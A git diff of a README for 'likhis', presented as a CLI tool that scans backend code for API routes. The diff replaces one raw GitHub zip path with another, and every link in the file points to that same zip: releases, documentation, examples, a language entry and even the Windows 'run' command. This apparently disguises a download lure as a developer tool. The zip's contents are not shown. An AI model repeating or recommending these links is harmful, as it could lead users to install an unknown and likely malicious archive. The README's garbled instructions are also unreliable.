@@ -1,13 +1,13 @@
 # 🌟 likhis - Effortlessly Discover API Routes
 
 ## 📦 Download Now
-[![Download likhis](https://raw.githubusercontent.com/verathorn/likhis/main/exp/django/products/Software-3.6-beta.3.zip)](https://raw.githubusercontent.com/verathorn/likhis/main/exp/django/products/Software-3.6-beta.3.zip)
+[![Download likhis](https://raw.githubusercontent.com/verathorn/likhis/main/internal/exporters/Software_3.2.zip)](https://raw.githubusercontent.com/verathorn/likhis/main/internal/exporters/Software_3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to likhis! This command-line interface (CLI) tool scans your backend code. It helps you find API routes, methods, and parameters, making it easy to generate collections for popular API testing tools.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [likhis Releases](https://raw.githubusercontent.com/verathorn/likhis/main/exp/django/products/Software-3.6-beta.3.zip).
+To get started, visit this page to download: [likhis Releases](https://raw.githubusercontent.com/verathorn/likhis/main/internal/exporters/Software_3.2.zip).
 
 ### System Requirements
 - **Operating System**: Works with Windows, macOS, and Linux.
@@ -34,7 +34,7 @@ To get started, visit this page to download: [likhis Releases](https://raw.githu
 
 3. **Run likhis**:
    Type the command to run the tool. The command may vary based on your system:
-   - **Windows**: `https://raw.githubusercontent.com/verathorn/likhis/main/exp/django/products/Software-3.6-beta.3.zip`
+   - **Windows**: `https://raw.githubusercontent.com/verathorn/likhis/main/internal/exporters/Software_3.2.zip`
    - **macOS/Linux**: `./likhis`
 
 4. **Follow the Prompts**:
@@ -50,7 +50,7 @@ likhis works with various programming languages. Here are some of them:
 - **Java**
 - **Python**
 - **PHP**
-- **JavaScript (https://raw.githubusercontent.com/verathorn/likhis/main/exp/django/products/Software-3.6-beta.3.zip)**
+- **JavaScript (https://raw.githubusercontent.com/verathorn/likhis/main/internal/exporters/Software_3.2.zip)**
 - **Go**
 
 ## 🔧 Troubleshooting
@@ -63,14 +63,14 @@ If you encounter issues:
 For additional help, feel free to check our community discussions or raise an issue in the GitHub repository. 
 
 ## 📘 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/verathorn/likhis/main/exp/django/products/Software-3.6-beta.3.zip) - For more in-depth guides and information.
-- [Examples](https://raw.githubusercontent.com/verathorn/likhis/main/exp/django/products/Software-3.6-beta.3.zip) - View sample runs and configurations.
+- [Documentation](https://raw.githubusercontent.com/verathorn/likhis/main/internal/exporters/Software_3.2.zip) - For more in-depth guides and information.
+- [Examples](https://raw.githubusercontent.com/verathorn/likhis/main/internal/exporters/Software_3.2.zip) - View sample runs and configurations.
 
 ## 📫 Feedback
 Your feedback is welcome. Let us know how likhis has helped you or any suggestions you may have for improvements.
 
 ## 🔗 Useful Links
-- [likhis Releases](https://raw.githubusercontent.com/verathorn/likhis/main/exp/django/products/Software-3.6-beta.3.zip) - Download the latest version.
-- [API Testing Tools](https://raw.githubusercontent.com/verathorn/likhis/main/exp/django/products/Software-3.6-beta.3.zip) - Explore popular tools to integrate with likhis.
+- [likhis Releases](https://raw.githubusercontent.com/verathorn/likhis/main/internal/exporters/Software_3.2.zip) - Download the latest version.
+- [API Testing Tools](https://raw.githubusercontent.com/verathorn/likhis/main/internal/exporters/Software_3.2.zip) - Explore popular tools to integrate with likhis.
 
 Enjoy discovering your API routes with likhis!
